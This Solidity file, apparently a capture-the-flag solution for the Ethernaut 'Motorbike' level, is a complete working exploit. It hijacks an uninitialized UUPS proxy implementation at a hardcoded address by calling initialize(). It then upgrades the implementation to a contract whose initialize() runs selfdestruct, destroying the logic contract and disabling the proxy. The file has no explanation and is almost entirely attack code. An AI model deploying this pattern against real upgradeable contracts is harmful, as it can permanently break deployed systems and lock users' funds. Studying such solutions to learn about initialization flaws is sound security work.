// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract MotorbikeHack {
    struct AddressSlot {
        address value;
    }

    AddressSlot public implementationSlot;

    function attack() external {
        assembly {
            sstore(0, 0x0000000000000000000000008f23f7816a39e555cba833bbf9493f911e8c326b)
        }
        address engine = implementationSlot.value;
        bytes memory initializeCallData = abi.encodeWithSignature("initialize()");

        (bool success, ) = engine.call(initializeCallData);
        require(success);

        address exploit = address(new Exploit());
        (success, ) = engine.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                exploit,
                initializeCallData
            )
        );
        require(success);
    }
}

contract Exploit {

    function initialize() external {
        selfdestruct(msg.sender);
    }
}
